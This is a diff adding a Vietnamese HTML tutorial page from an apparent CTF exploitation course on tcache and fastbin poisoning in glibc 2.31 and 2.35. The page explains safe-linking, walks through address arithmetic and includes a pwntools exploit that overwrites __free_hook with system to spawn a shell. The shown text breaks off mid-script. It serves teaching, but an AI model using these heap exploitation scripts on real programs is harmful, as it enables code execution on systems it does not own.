@@ -1,0 +1,532 @@
+<title>Tcache & Fastbin Poisoning</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,46px);line-height:1.03;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.frame{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.fr{display:grid;grid-template-columns:90px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.fr .o{color:var(--mem);white-space:nowrap}
+.fr.key{background:var(--accent-soft);border-color:var(--accent)}
+.scalc{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0}
+.scalc label{font-family:var(--font-mono);font-size:12px;color:var(--muted);display:block;margin:8px 0 4px}
+.scalc input{font-family:var(--font-mono);font-size:14px;padding:7px 10px;border:1px solid var(--line);border-radius:7px;background:var(--surface);color:var(--fg);width:100%}
+.scalc .out{margin-top:14px;font-family:var(--font-mono);font-size:13px;display:flex;flex-direction:column;gap:6px}
+.scalc .ro{display:flex;justify-content:space-between;gap:10px;border:1px solid var(--line);border-radius:7px;padding:8px 11px;background:var(--surface)}
+.scalc .ro b{color:var(--accent)}.scalc .ro.res{background:var(--mem-soft);border-color:var(--mem)}.scalc .ro.res b{color:var(--mem)}
+.scalc .chk{display:flex;gap:8px;align-items:center;margin-top:10px;font-family:var(--font-mono);font-size:13px}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 4 · Bài 20</div>
+    <h1>Tcache &amp; Fastbin Poisoning</h1>
+    <p class="sub">Biến một bug heap (UAF-edit / double-free / overflow) thành <strong>malloc trả về địa chỉ tùy ý</strong>: ghi đè con trỏ <code>fd</code> của chunk trong tcache/fastbin → chunk kế cấp ra chính là nơi bạn chọn → ghi tùy ý. Bài này đi <strong>số thật</strong> cả hai thế giới: glibc 2.31 (fd thô) và 2.35 (<mark>safe-linking</mark>), tính fd ra giá trị cụ thể.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Cao (Phase 4)</span>
+      <span class="chip"><b>glibc mẫu:</b> 2.31 &amp; 2.35</span>
+      <span class="chip"><b>Cần trước:</b> <a href="heap_bugs.html" style="color:inherit">heap_bugs</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~60 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Cơ chế</a><a href="#s4">04 Safe-link</a><a href="#s5">05 Máy tính</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Ý tưởng:</strong> tcache/fastbin là danh sách đơn liên kết qua <code>fd</code>. Ghi được <code>fd</code> của một chunk đang trong bin → trỏ nó tới <mark>địa chỉ đích</mark>. <code>malloc</code> lần sau trả chunk gốc, lần sau nữa trả <strong>đích</strong> → ghi vào đích.</p>
+    <p><strong>Cần:</strong> một chunk free trong bin mà bạn còn ghi được <code>fd</code> (qua UAF-edit, double-free, hay overflow đè fd).</p>
+    <p><strong>Rào (glibc ≥2.32):</strong> <mark>safe-linking</mark> — fd lưu dạng <code>(địa_chỉ_chunk &gt;&gt; 12) ⊕ target</code>. Phải <strong>leak heap</strong> để tính. Và tcache: <strong>alignment check</strong> (đích phải căn 0x10). Ở 2.31 thì fd thô, khỏi cần hai thứ này.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>ghi fd = chọn nơi malloc kế trả về. glibc mới thì fd = (pos&gt;&gt;12) ⊕ target.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🎯 Công thức</span>
+        <p>Có chunk free trong tcache/fast + ghi được fd → <code>fd = target</code> (glibc &lt;2.32) hoặc <code>fd = (pos&gt;&gt;12) ⊕ target</code> (≥2.32, <code>pos</code>=địa chỉ <b>chunk</b> đang chứa fd, không phải data). malloc 2 lần → lần 2 trả <code>target</code>.</p></div>
+      <div class="combat-row"><span class="lab">⚡ Skeleton tcache (2.31, fd thô)</span>
+<pre><code>alloc(0,0x40); free(0)              <span class="c"># 0 → tcache[0x40]</span>
+edit(0, p64(target))                <span class="c"># fd = target</span>
+alloc(1,0x40)                       <span class="c"># lấy chunk 0</span>
+alloc(2,0x40)                       <span class="c"># CHUNK 2 == target → ghi</span>
+edit(2, p64(value))</code></pre></div>
+      <div class="combat-row"><span class="lab">⚡ Skeleton tcache (2.35, safe-link)</span>
+<pre><code>def enc(pos,ptr): return (pos&gt;&gt;12) ^ ptr
+alloc(0,0x40); free(0)
+edit(0, p64(enc(heap+off0, target)))  <span class="c"># pos = &amp;chunk0</span>
+alloc(1,0x40); alloc(2,0x40)          <span class="c"># 2 == target (căn 0x10!)</span></code></pre></div>
+      <div class="combat-row"><span class="lab">🔑 Đích ghi hay dùng</span>
+        <p><code>__free_hook</code>/<code>__malloc_hook</code> (≤2.33) · <code>_IO_2_1_stdout_</code> (FSOP) · <code>__exit_funcs</code> (<a href="exit_handlers.html">exit</a>) · con trỏ trong struct chương trình · stack (nếu leak).</p></div>
+      <div class="combat-row"><span class="lab">⚠️ Bẫy căn (≥2.32 tcache)</span>
+        <p>tcache kiểm <code>target &amp; 0xf == 0</code> (căn 16), lệch → <code>"malloc(): unaligned tcache chunk detected"</code>. Lùi/tiến tới ô căn gần. Fastbin: cần fake size hợp lệ tại <code>target−0x8</code>.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Bin đơn liên kết qua fd</h2>
+  <p>tcache và fastbin đều là <strong>danh sách đơn (singly-linked LIFO)</strong>: head trỏ tới chunk mới free nhất, mỗi chunk trỏ tới chunk free trước qua trường <code>fd</code> (ở <code>chunk+0x10</code> — tức đầu vùng data cũ). <code>malloc</code> lấy từ head; <code>free</code> đẩy vào head.</p>
+  <figure class="dg">
+  <svg viewBox="0 0 620 90" role="img" aria-label="head → C → B → A qua con trỏ fd; đổi fd của C thành target làm danh sách rẽ sang target" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <defs><marker id="a1" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="currentColor" stroke="none"/></marker>
+    <marker id="a1o" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#e8663e" stroke="none"/></marker></defs>
+    <g font-family="monospace" font-size="12">
+    <text x="30" y="46" fill="currentColor" stroke="none">head</text>
+    <rect x="70" y="28" width="70" height="34" rx="7" stroke-width="1.5"/><text x="105" y="50" text-anchor="middle" fill="currentColor" stroke="none">C</text>
+    <rect x="200" y="28" width="70" height="34" rx="7" stroke-width="1.3"/><text x="235" y="50" text-anchor="middle" fill="currentColor" stroke="none">B</text>
+    <rect x="330" y="28" width="70" height="34" rx="7" stroke-width="1.3"/><text x="365" y="50" text-anchor="middle" fill="currentColor" stroke="none">A</text>
+    <rect x="470" y="12" width="120" height="30" rx="7" stroke-width="1.7" stroke="#e8663e"/><text x="530" y="32" text-anchor="middle" fill="#e8663e" stroke="none">target</text>
+    <line x1="64" y1="45" x2="68" y2="45" stroke-width="1.4" marker-end="url(#a1)"/>
+    <line x1="140" y1="45" x2="198" y2="45" stroke-width="1.4" marker-end="url(#a1)"/>
+    <line x1="270" y1="45" x2="328" y2="45" stroke-width="1.3" marker-end="url(#a1)" opacity="0.4"/>
+    <line x1="140" y1="40" x2="468" y2="27" stroke="#e8663e" stroke-width="1.6" marker-end="url(#a1o)"/>
+    <text x="300" y="20" font-size="10.5" fill="#e8663e" stroke="none">C.fd := target (ghi đè)</text>
+    </g>
+  </svg>
+  <figcaption>Đổi <code>C.fd</code> thành target → malloc C rồi malloc lần nữa sẽ trả về target.</figcaption>
+  </figure>
+
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">poisoning</div><p>Ghi đè fd để lái malloc về đích.</p></div>
+    <div class="card"><div class="term">arbitrary allocation</div><p>Ép malloc trả chunk tại địa chỉ tùy ý.</p></div>
+    <div class="card"><div class="term">pos</div><p>Địa chỉ CHUNK (header) đang giữ fd — dùng cho safe-link.</p></div>
+    <div class="card"><div class="term">fake size</div><p>Dựng size hợp lệ tại target cho fastbin.</p></div>
+  </div>
+
+  <h4 style="margin-top:8px">Khác biệt tcache vs fastbin</h4>
+  <div class="tablewrap"><table>
+    <thead><tr><th></th><th>tcache</th><th>fastbin</th></tr></thead>
+    <tbody>
+      <tr><td>Size</td><td>0x20–0x410</td><td>0x20–0x80</td></tr>
+      <tr><td>Kiểm size khi malloc</td><td class="no">Không (≤2.33) / nhẹ (≥2.34)</td><td class="yes">CÓ (size target phải khớp bin)</td></tr>
+      <tr><td>Chống double-free</td><td>key (≥2.29)</td><td>so với đỉnh bin</td></tr>
+      <tr><td>Alignment check target</td><td class="yes">≥2.32 có</td><td class="maybe">qua fake size</td></tr>
+      <tr><td>Độ dễ poisoning</td><td class="yes">Dễ nhất</td><td class="maybe">Cần fake size hợp lệ</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note tip"><span class="tag">Chốt</span>Ưu tiên <strong>tcache poisoning</strong> vì không kiểm size target. Chỉ dùng fastbin khi tcache đầy/không khả dụng (khi đó phải lo "fake size" tại đích).</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Từ bug tới ghi tùy ý</h2>
+  <p>Bài <a href="heap_bugs.html">heap_bugs</a> cho bạn <em>chạm</em> vào <code>fd</code>. Poisoning là bước <em>biến</em> cú chạm đó thành nguyên thủy mạnh nhất của heap: <strong>arbitrary allocation</strong> — ép allocator cấp một chunk nằm chồng lên cấu trúc bạn muốn sửa. Có chunk nằm trên đích → đọc = leak, ghi = sửa. Đây là "động cơ" của hầu hết lời giải heap hiện đại.</p>
+  <p>Chuỗi điển hình: <strong>bug → leak (libc/heap) → poisoning → ghi đích điều khiển (hook/FILE/exit) → RCE</strong>.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ · MỤC LÕI</div>
+  <h2>Tcache poisoning từng bước (số thật 2.31)</h2>
+  <p>Heap base <code>0x405000</code>, đích <code>__free_hook = 0x7ffff7fae48</code>... (ở phiên này libc base <code>0x7ffff7dbf000</code> → <code>__free_hook = 0x7ffff7fade48</code>, <code>system = 0x7ffff7e11290</code>).</p>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Đưa chunk vào bin</h4><p><code>alloc(0,0x40)</code> @ chunk <code>0x405290</code>, <code>free(0)</code> → đỉnh tcache[0x40].</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Ghi fd = đích</h4><p>UAF-edit: ghi <code>p64(0x7ffff7fade48)</code> vào <code>0x4052a0</code> (data = fd). 2.31 fd thô, khỏi mã hóa.</p></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Lấy ra chunk gốc</h4><p><code>alloc(1,0x40)</code> → trả <code>0x4052a0</code>; head giờ = <code>0x7ffff7fade48</code>.</p></div></div>
+  <div class="step"><div class="n">4</div><div class="body"><h4>Lấy ra đích</h4><p><code>alloc(2,0x40)</code> → trả <code>0x7ffff7fade48</code> (= &amp;__free_hook). <code>edit(2, p64(system))</code> = ghi tùy ý.</p></div></div>
+
+  <h3>Bảng-byte: chunk free (tcache) &amp; giá trị ghi vào fd</h3>
+  <div class="frame">
+    <div class="fr"><span class="o">0x405290</span><span>prev_size (không dùng)</span></div>
+    <div class="fr"><span class="o">0x405298</span><span>size | P = <code>0x41</code> (chunk 0x40, PREV_INUSE)</span></div>
+    <div class="fr key"><span class="o">0x4052a0</span><span><b>fd</b> ← ghi <code>p64(target)</code> (2.31) hoặc <code>p64(enc(0x405290,target))</code> (≥2.32)</span></div>
+    <div class="fr"><span class="o">0x4052a8</span><span>key = &amp;tcache_perthread (<code>0x405010</code>) — xóa nếu cần né double-free</span></div>
+  </div>
+ </div>
+</section>
+
+<!-- 04 Safe-link -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / SAFE-LINKING</div>
+  <h2>Vượt bảo vệ fd (glibc ≥ 2.32) — tính số thật</h2>
+  <p>Từ glibc 2.32, fd không lưu thô mà <strong>mã hóa</strong> để chống ghi đè đoán mò:</p>
+  <pre><code>stored_fd = (địa_chỉ_chunk_chứa_fd &gt;&gt; <span class="d">12</span>) ⊕ next_ptr      <span class="c">; PROTECT_PTR (khi free)</span>
+next_ptr  = (địa_chỉ_chunk_chứa_fd &gt;&gt; <span class="d">12</span>) ⊕ stored_fd      <span class="c">; REVEAL_PTR (khi đọc)</span></code></pre>
+  <p>Muốn fd demangle ra <code>target</code>, ghi <code>fd_cần = (pos &gt;&gt; 12) ⊕ target</code> với <code>pos</code> = địa chỉ <strong>chunk</strong> (header, không phải data). Ví dụ số thật (glibc 2.35, chunk 0x90):</p>
+  <pre><code>pos    = <span class="p">0x555555559290</span>        <span class="c"># địa chỉ chunk giữ fd</span>
+target = <span class="p">0x7ffff7e1be48</span>        <span class="c"># __free_hook (2.35)</span>
+pos&gt;&gt;12 = <span class="p">0x555555559</span>
+fd_cần = <span class="p">0x555555559</span> ⊕ <span class="p">0x7ffff7e1be48</span> = <span class="p">0x7ffaa2b4eb11</span>
+<span class="c"># ghi p64(0x7ffaa2b4eb11) vào chunk+0x10</span></code></pre>
+  <div class="note warn"><span class="tag">Hai bẫy kèm theo</span>① <strong>Alignment</strong>: tcache (≥2.32) kiểm <code>target &amp; 0xf == 0</code>, lệch → <code>"unaligned tcache chunk"</code>. ② <strong>Leak heap</strong>: cần biết <code>pos&gt;&gt;12</code> → lấy từ UAF-read fd của chunk tcache đã free: với chunk đầu (next=NULL), stored_fd = <code>pos&gt;&gt;12</code> → đọc ra trực tiếp heap&gt;&gt;12. Xem <a href="heap_bugs.html">heap_bugs §UAF-read</a>.</div>
+
+  <details><summary>▸ Vì sao safe-linking không chặn hoàn toàn</summary>
+  <div class="dc"><p>Mã hóa chỉ dựa trên <code>pos&gt;&gt;12</code> — mà 12 bit thấp của chunk luôn giống nhau trong 1 trang và heap thường đoán được phần cao. Khi đã leak được 1 con trỏ heap, <code>pos</code> là tất định → encode lại dễ dàng. Safe-linking tăng độ khó (buộc leak heap) chứ không ngăn được poisoning.</p></div></details>
+ </div>
+</section>
+
+<!-- 05 Máy tính -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Máy tính safe-linking</h2>
+  <p>Nhập địa chỉ chunk giữ fd (<code>pos</code>) và <code>target</code> → ra giá trị <code>fd</code> cần ghi. Bật "glibc &lt;2.32" để xem khi chưa có safe-linking (fd = target).</p>
+  <div class="lab">
+    <div class="scalc">
+      <label>pos — địa chỉ chunk giữ fd (header):</label>
+      <input id="sP" value="0x555555559290" autocomplete="off">
+      <label>target — nơi muốn malloc trả về:</label>
+      <input id="sT" value="0x7ffff7e1be48" autocomplete="off">
+      <div class="chk"><input type="checkbox" id="sOld"> <label for="sOld" style="margin:0;color:var(--fg)">glibc &lt; 2.32 (fd thô)</label></div>
+      <div class="out" id="sOut"></div>
+    </div>
+    <p class="lab-sub"><code>fd = (pos &gt;&gt; 12) ⊕ target</code>. Cảnh báo nếu target không căn 0x10.</p>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Chuẩn bị số liệu</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Leak heap (cho safe-link ≥2.32)</h4>
+    <pre><code><span class="c"># free 1 chunk tcache, UAF-read fd (next=NULL) → giá trị = pos&gt;&gt;12</span>
+heap_lo = u64(show(<span class="d">0</span>)[:<span class="d">8</span>].ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>))   <span class="c"># = chunk0&gt;&gt;12</span>
+heap_base = (heap_lo &lt;&lt; <span class="d">12</span>) - <span class="d">0x...</span>        <span class="c"># tinh chỉnh offset chunk trong heap</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Chọn đích &amp; kiểm size (fastbin)</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> p/x (long)&amp;__free_hook   <span class="c"># đích</span>
+<span class="c"># fastbin: cần *(target-0x8) khớp size bin. tcache: bỏ qua.</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Tính fd</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> enc = <span class="k">lambda</span> pos,ptr: (pos&gt;&gt;<span class="d">12</span>)^ptr   <span class="c"># ≥2.32</span>
+<span class="p">&gt;&gt;&gt;</span> fd = enc(chunk0_addr, free_hook)</code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ — POISONING → __free_hook → SHELL</div>
+  <h2>Hai bản số thật: 2.31 (fd thô) &amp; 2.35 (safe-link)</h2>
+  <p>Menu alloc/free/edit/show, UAF-edit. Đã leak libc (từ unsorted) &amp; heap (từ tcache fd). Mục tiêu: ghi <code>__free_hook = system</code>, free <code>"/bin/sh"</code>.</p>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · 2.31 (fd thô)</button>
+    <button class="tab" data-t="b">B · 2.35 (safe-link)</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — glibc 2.31. fd thô, không cần leak heap, không alignment check.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe  = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+<span class="c"># ... alloc/free/edit/show như bài heap_bugs ...</span>
+
+<span class="c"># leak libc (unsorted): libc.address = leak - 0x1ecbe0  (xem heap_internals)</span>
+alloc(<span class="d">0</span>,<span class="d">0x4f8</span>); alloc(<span class="d">1</span>,<span class="d">0x18</span>); free(<span class="d">0</span>)
+libc.address = u64(show(<span class="d">0</span>)[:<span class="d">8</span>].ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>)) - <span class="d">0x1ecbe0</span>
+
+<span class="c"># tcache poisoning → __free_hook</span>
+alloc(<span class="d">2</span>,<span class="d">0x40</span>); free(<span class="d">2</span>)
+edit(<span class="d">2</span>, p64(libc.sym.__free_hook))     <span class="c"># fd = &amp;__free_hook (thô)</span>
+alloc(<span class="d">3</span>,<span class="d">0x40</span>); alloc(<span class="d">4</span>,<span class="d">0x40</span>)      <span class="c"># chunk4 == &amp;__free_hook</span>
+edit(<span class="d">4</span>, p64(libc.sym.system))         <span class="c"># __free_hook = system</span>
+alloc(<span class="d">5</span>,<span class="d">0x20</span>,b<span class="s">"/bin/sh\x00"</span>); free(<span class="d">5</span>)   <span class="c"># system("/bin/sh")</span>
+p.interactive()</code></pre>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — glibc 2.35. CẦN leak heap + encode fd + target căn 0x10.</span>
+<span class="c"># 2.35 bỏ __free_hook! Đích chuyển sang stdout FSOP — nhưng để minh họa</span>
+<span class="c"># poisoning, giả sử đích là một con trỏ hàm struct chương trình (căn 0x10).</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe  = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)   <span class="c"># 2.35</span>
+p = process(exe.path)
+enc = <span class="k">lambda</span> pos,ptr: (pos&gt;&gt;<span class="d">12</span>) ^ ptr
+
